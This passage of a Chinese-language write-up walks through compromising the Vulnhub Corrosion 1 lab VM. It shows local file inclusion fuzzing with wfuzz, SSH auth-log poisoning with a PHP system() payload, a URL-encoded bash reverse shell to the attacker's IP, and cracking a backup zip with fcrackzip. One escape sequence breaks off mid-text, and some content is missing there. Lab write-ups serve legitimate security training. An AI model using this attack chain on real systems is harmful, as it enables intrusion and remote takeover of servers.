u003ccode\u003erandylogs.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003euploads\u003c/code\u003e 回到跟\u003ccode\u003eindex\u003c/code\u003e一样\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e发现\u003ccode\u003erandylogs.php\u003c/code\u003e 根据提示关于日志的，应该会有\u003ccode\u003eLFI\u003c/code\u003e ，使用\u003ccode\u003ewfuzz\u003c/code\u003e测试一下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewfuzz -c -w /usr/share/wordlists/wfuzz/general/common.txt --hh \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e  http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e/blog-post/archives/randylogs.php?FUZZ=/etc/passwd\n********************************************************\n* Wfuzz \u003cspan class=\"hljs-number\"\u003e3.1\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e/blog-post/archives/randylogs.php?FUZZ=/etc/passwd\nTotal requests: \u003cspan class=\"hljs-number\"\u003e951\u003c/span\u003e\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                                                                                                          \n=====================================================================\n\n000000341:   \u003cspan class=\"hljs-number\"\u003e200\u003c/span\u003e        \u003cspan class=\"hljs-number\"\u003e48\u003c/span\u003e L     \u003cspan class=\"hljs-number\"\u003e85\u003c/span\u003e W       \u003cspan class=\"hljs-number\"\u003e2832\u003c/span\u003e Ch     \u003cspan class=\"hljs-string\"\u003e\"file\"\u003c/span\u003e                                                                                                                                           \n\nTotal time: \u003cspan class=\"hljs-number\"\u003e1.095735\u003c/span\u003e\nProcessed Requests: \u003cspan class=\"hljs-number\"\u003e951\u003c/span\u003e\nFiltered Requests: \u003cspan class=\"hljs-number\"\u003e950\u003c/span\u003e\nRequests/sec.: \u003cspan class=\"hljs-number\"\u003e867.9099\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现参数\u003ccode\u003efile\u003c/code\u003e ，在浏览器访问，成功包含\u003ccode\u003e/etc/passwd\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubCorrosion%201/image85.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e根据提示\u003ccode\u003eChange permissions for auth log\u003c/code\u003e 身份认证日志的权限，尝试包含\u003ccode\u003eauth.log\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubCorrosion%201/image86.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e成功包含，发现日志一直在更新，并且上面有\u003ccode\u003ecron\u003c/code\u003e ，可能存在\u003ccode\u003ecron\u003c/code\u003e任务\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e因为可以包含\u003ccode\u003eauth.log\u003c/code\u003e （记录\u003ccode\u003essh\u003c/code\u003e登陆成功失败的日志），所以我们可以污染它\u003c/p\u003e\n\u003cp\u003e但这里我遇到一个问题，我原本是想通过\u003ccode\u003essh '\u0026#x3C;?php system($_GET['c']); ?\u003e'@192.168.56.4\u003c/code\u003e 来进行登录然后污染日志文件的，但是报错了：\u003ccode\u003eremote username contains invalid characters\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubCorrosion%201/image87.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e网上查阅到信息：\u003ca href=\"https://stackoverflow.com/questions/77948173/how-to-perform-ssh-log-poisoning-for-rce-with-lfi-using-php-system-call-in-usern\"\u003ehttps://stackoverflow.com/questions/77948173/how-to-perform-ssh-log-poisoning-for-rce-with-lfi-using-php-system-call-in-usern\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e好像是因为\u003ccode\u003essh\u003c/code\u003e 版本过于新导致的，然后我开了\u003ccode\u003eUbuntu18.0.4\u003c/code\u003e 去进行登录，成功了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnhubCorrosion%201/image88.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e测试是否污染成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eandylogs.php?file=/var/log/auth.log\u0026#x26;c=whoami\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eNov \u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e23\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e40\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e39\u003c/span\u003e corrosion sshd[\u003cspan class=\"hljs-number\"\u003e2517\u003c/span\u003e]: Connection closed by invalid user www-data\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e爆出当前用户名\u003ccode\u003ewww-data\u003c/code\u003e 污染成功\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e进行反弹\u003ccode\u003eshell\u003c/code\u003e ，同时\u003ccode\u003ekali\u003c/code\u003e进行监听\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebash -c \u003cspan class=\"hljs-string\"\u003e'bash -i \u003e\u0026#x26; /dev/tcp/192.168.56.10/1234 0\u003e\u0026#x26;1'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进行URL编码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebash+-c+%27bash+-i+%3e%\u003cspan class=\"hljs-number\"\u003e26\u003c/span\u003e+%2fdev%2ftcp%2f192\u003cspan class=\"hljs-number\"\u003e.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.56\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e%2f1234+\u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e%3e%\u003cspan class=\"hljs-number\"\u003e261\u003c/span\u003e%\u003cspan class=\"hljs-number\"\u003e27\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e进行反弹shell\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003erandylogs.php?file=/var/log/auth.log\u0026#x26;c=bash+-c+\u003cspan class=\"hljs-string\"\u003e'bash+-i+\u003e%26+%2fdev%2ftcp%2f192.168.56.10%2f1234+0\u003e%261'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获得\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@corrosion:/var/www/html/blog-post/archives$ whoami\nwww-data\nwww-data@corrosion:/var/www/html/blog-post/archives$ \u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data) gid=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data) groups=\u003cspan class=\"hljs-number\"\u003e33\u003c/span\u003e(www-data)\nwww-data@corrosion:/var/www/html/blog-post/archives$ uname -a\nLinux corrosion \u003cspan class=\"hljs-number\"\u003e5.11\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e25\u003c/span\u003e-generic \u003cspan class=\"hljs-comment\"\u003e#27-Ubuntu SMP Fri Jul 9 23:06:29 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e寻找敏感文件\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e在\u003ccode\u003e/var/backups\u003c/code\u003e下发现文件\u003ccode\u003euser_backups.zip\u003c/code\u003e ,刚好有权限，我们将它复制到\u003ccode\u003e/tmp\u003c/code\u003e目录并且解压\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@corrosion:/var/backups$ ls -al\n-rw-r--r--  \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e root root    \u003cspan class=\"hljs-number\"\u003e3285\u003c/span\u003e Jul \u003cspan class=\"hljs-number\"\u003e30\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e2021\u003c/span\u003e user_backup.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e\nwww-data@corrosion:/var/backups$ cp user_backup.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e /tmp\nwww-data@corrosion:/var/backups$ cd /tmp\nwww-data@corrosion:/tmp$ unzip user_backup.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e\nunzip user_backup.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e\nArchive:  user_backup.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e\n   skipping: id_rsa                  unable to get password\n   skipping: id_rsa.pub              unable to get password\n   skipping: my_password.txt         unable to get password\n   skipping: easysysinfo.c           unable to get password\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现需要密码，我们将它（靶机使用python搭建简易服务器）下载到\u003ccode\u003ekali\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e破解\u003ccode\u003ezip\u003c/code\u003e文件\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003efcrackzip\u003c/code\u003e工具进行破解，并且使用指点\u003ccode\u003erockyou\u003c/code\u003e （破解率较高）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003efcrackzip -D -p /usr/share/wordlists/rockyou.txt -u user_backup.\u003cspan class=\"hljs-built_in\"\u003ezip\u003c/span\u003e \n\nPASSWORD FOUND!!!!: pw == !randybaby\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e破解出密码\u003ccode\u003e!randybaby\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看压缩包文件\u003c/p\u003e\n\u003cp\u003e解压出四个文件 \u003ccode\u003eid_rsa\u003c/code\u003e \u003ccode\u003eid_rsa.pub\u003c/code\u003e \u003ccode\u003emy_password.txt\u003c/code\u003e \u003ccode\u003eeasysysinfo.c\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u0 p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e## eseysysinfo.py\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#!/usr/bin/python3.9\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eimport\u003c/span\u003e os\ncommand1 = \u003cspan class=\"hljs-string\"\u003e\"/usr/bin/date\"\u003c/span\u003e\ncommand2 = \u003cspan class=\"hljs-string\"\u003e\"/usr/bin/cat /etc/hosts\"\u003c/span\u003e\ncommand3 = \u003cspan class=\"hljs-string\"\u003e\"/usr/bin/uname -a\"\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"hljs-title function_\"\u003eoutput\u003c/span\u003e():\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Today is: \"\u003c/span\u003e)\n        os.system(command1)\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"\\n\"\u003c/span\u003e)\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Hosts File: \"\u003c/span\u003e)\n        os.system(command2)\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"\\n\"\u003c/span\u003e)\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"Kernal Version: \"\u003c/span\u003e)\n        os.system(command3)\noutput()\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cp\u003e可以使用\u003ccode\u003esudo\u003c/code\u003e权限执行\u003ccode\u003e/home/randy/tools/easysysinfo\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003erandy@corrosion:~/tools$ sudo -l
